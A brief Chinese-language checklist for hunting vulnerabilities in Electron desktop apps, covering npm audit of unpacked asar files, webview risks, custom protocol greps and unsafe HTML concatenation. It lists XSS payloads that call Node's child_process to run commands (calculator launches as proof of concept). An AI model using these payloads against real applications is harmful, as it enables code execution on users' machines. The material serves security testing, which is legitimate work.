挖掘思路
========================================

组件漏洞
----------------------------------------
+ 使用asar解压程序文件，切换到解压目录中.
+ 执行 npm install --package-lock-only 生成package-lock.json文件。
+ 执行 npm audit --verbose进行组件漏洞分析。

XSS漏洞
----------------------------------------
+ 示例程序：https://github.com/MrH4r1/Electro-XSS
+ payload
    - ``<img src=x onerror=alert(1) />``
    - ``<img src=x onerror=alert(require('child_process').execSync('gnome-calculator')); />``
    - ``<img src=x onerror=alert(require('child_process').exec('calc')); />``

IPC攻击
----------------------------------------

webview攻击
----------------------------------------
+ webPreferences中启用webview：
    - webviewTag: true
    - <webview src="http://malicious.site"></webview>

升级漏洞
----------------------------------------

查看是否有自定义协议
----------------------------------------
+ grep -r "registerHttpProtocol" ./

查找有无html内容拼接
----------------------------------------
    ::
    
        var $input2 = $("<input type='text' value='"+value+"' name='value' class='form-control' style=' width:20%; display: inline-block;' placeholder='value'>");
        分析拼接的输入点是否用户可控，查看是否有xss漏洞。